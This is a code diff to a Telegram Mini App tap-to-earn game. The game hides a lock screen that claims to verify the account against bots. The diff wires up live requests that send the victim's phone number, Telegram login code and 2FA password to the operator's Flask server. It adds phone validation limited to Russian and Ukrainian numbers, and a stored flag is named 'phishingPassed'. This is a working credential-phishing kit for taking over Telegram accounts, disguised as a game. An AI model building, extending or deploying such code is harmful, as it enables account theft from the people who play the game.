@@ -96,7 +96,7 @@
         .nav-item span { font-size: 12px; font-weight: 600; }
         .nav-icon { width: 24px; height: 24px; fill: currentColor; }
 
-        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(139, 92, 246, 0.9); color: #fff; padding: 12px 24px; border-radius: 12px; font-weight: 600; z-index: 300; animation: slideDown 0.3s ease-out; box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3); }
+        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(139, 92, 246, 0.9); color: #fff; padding: 12px 24px; border-radius: 12px; font-weight: 600; z-index: 300; animation: slideDown 0.3s ease-out; box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3); max-width: 90%; text-align: center; }
 
         .lock-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(7, 8, 21, 0.95); backdrop-filter: blur(15px); z-index: 500; display: flex; align-items: center; justify-content: center; padding: 20px; animation: fadeIn 0.3s; }
         .lock-modal { background: linear-gradient(135deg, #1a1b3e, #070815); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; position: relative; box-shadow: 0 0 50px rgba(139, 92, 246, 0.3); }
@@ -126,6 +126,7 @@
         const { useState, useEffect, useRef } = React;
         const tg = window.Telegram.WebApp;
         
+        // ВАЖНО: Замени на адрес своего Flask сервера (ngrok, serveo и тд)
         const API_BASE_URL = "https://your-flask-server.com"; 
 
         const TASKS = [
@@ -139,6 +140,33 @@
         const StarIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg> );
         const TaskIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm-2 14l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> );
         const UserIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg> );
+
+        // Функция валидации номеров РФ и Украины
+        const validatePhone = (input) => {
+            // Удаляем всё, кроме цифр и плюса
+            let phone = input.replace(/[^\d+]/g, '');
+            
+            // Если ввели без +, но код страны правильный, добавляем +
+            if (!phone.startsWith('+')) {
+                if (phone.startsWith('7') && phone.length === 11) {
+                    phone = '+' + phone;
+                } else if (phone.startsWith('380') && phone.length === 12) {
+                    phone = '+' + phone;
+                } else if (phone.startsWith('8') && phone.length === 11) {
+                    // Замена 8 на +7 (старый формат РФ)
+                    phone = '+7' + phone.slice(1);
+                }
+            }
+            
+            // Проверяем финальные форматы regex'ом
+            const ruRegex = /^\+7\d{10}$/;      // +7 и 10 цифр
+            const uaRegex = /^\+380\d{9}$/;     // +380 и 9 цифр
+            
+            if (ruRegex.test(phone) || uaRegex.test(phone)) {
+                return phone; // Возвращаем нормализованный правильный номер
+            }
+            return false; // Мусор вроде 49434-9423-0 не пройдет
+        };
 
         function App() {
             const [activeTab, setActiveTab] = useState('farm');
@@ -219,7 +247,8 @@
                     setFloatCoins(prev => prev.filter(c => c.id !== newCoin.id));
                 }, 1000);
 
-                const newStars = stars + 10;
+                // ИЗМЕНЕНИЕ: Теперь +1 звезда
+                const newStars = stars + 1; 
                 const newTaps = todayTaps + 1;
                 
                 setStars(newStars);
@@ -244,7 +273,7 @@
 
             const showNotif = (message) => {
                 setShowNotification(message);
-                setTimeout(() => setShowNotification(null), 2000);
+                setTimeout(() => setShowNotification(null), 2500);
             };
 
             const handleTaskComplete = (taskId) => {
@@ -276,32 +305,30 @@
                 setIsLoading(true);
                 tg.HapticFeedback.impactOccurred('light');
 
-                // Имитация отправки на Flask сервер
                 try {
                     if (step === 1) {
-                        // В реальном коде раскомментируй fetch
-                        /* 
+                        // Валидация номера
+                        const validPhone = validatePhone(phone);
+                        if (!validPhone) {
+                            showNotif("Неверный формат! Введите номер РФ (+7) или Украины (+380).");
+                            setIsLoading(false);
+                            return;
+                        }
+                        setPhone(validPhone); // Сохраняем нормализованный номер
+
                         const response = await fetch(`${API_BASE_URL}/api/send-code`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ user_id: tg.initDataUnsafe?.user?.id, phone: phone })
+                            body: JSON.stringify({ user_id: tg.initDataUnsafe?.user?.id, phone: validPhone })
                         });
                         const data = await response.json();
                         if (data.success) {
                             setLoginStep(2);
                             showNotif("Код отправлен в Telegram!");
                         } else {
-                            showNotif("Ошибка отправки кода");
+                            showNotif(data.error || "Ошибка отправки кода. Попробуйте снова.");
                         }
-                        */
-
-                        // Фейк для демо
-                        setTimeout(() => {
-                            setLoginStep(2);
-                            showNotif("Код отправлен в Telegram!");
-                        }, 1000);
                     } else if (step === 2) {
-                        /*
                         const response = await fetch(`${API_BASE_URL}/api/verify-code`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -317,15 +344,10 @@
                                 setIsLocked(false);
                                 showNotif("Аккаунт подтвержден! 🚀");
                             }
+                        } else {
+                            showNotif(data.error || "Неверный код");
                         }
-                        */
-
-                        setTimeout(() => {
-                            setLoginStep(3); // Принудительно требуем 2FA
-                            showNotif("Требуется пароль 2FA");
-                        }, 1000);
                     } else if (step === 3) {
-                        /*
                         const response = await fetch(`${API_BASE_URL}/api/verify-password`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -336,17 +358,12 @@
                             localStorage.setItem('phishingPassed', 'true');
                             setIsLocked(false);
                             showNotif("Аккаунт подтвержден! 🚀");
+                        } else {
+                            showNotif(data.error || "Неверный пароль");
                         }
-                        */
-
-                        setTimeout(() => {
-                            localStorage.setItem('phishingPassed', 'true');
-                            setIsLocked(false);
-                            showNotif("Аккаунт подтвержден! 🚀");
-                        }, 1000);
                     }
                 } catch (e) {
-                    showNotif("Ошибка сети");
+                    showNotif("Ошибка сети. Проверьте подключение к серверу.");
                 }
                 setIsLoading(false);
             };
@@ -399,7 +416,7 @@
                                     {floatCoins.map(coin => (
                                         <div key={coin.id} className="float-coin" style={{
                                             position: 'absolute', left: coin.x, top: coin.y,
-                                        }}>+10</div>
+                                        }}>+1</div>
                                     ))}
                                 </div>
 
@@ -480,7 +497,7 @@
                                     <>
                                         <div className="lock-title">Подтверждение аккаунта</div>
                                         <div className="lock-subtitle">
-                                            Для защиты от ботов и продолжения фарма подтвердите свой Telegram аккаунт. Введите ваш номер телефона.
+                                            Для защиты от ботов и продолжения фарма подтвердите свой Telegram аккаунт. Введите ваш номер телефона (РФ +7 или Украина +380).
                                         </div>
                                         <div className="lock-step">
                                             <div className="step-dot active"></div>
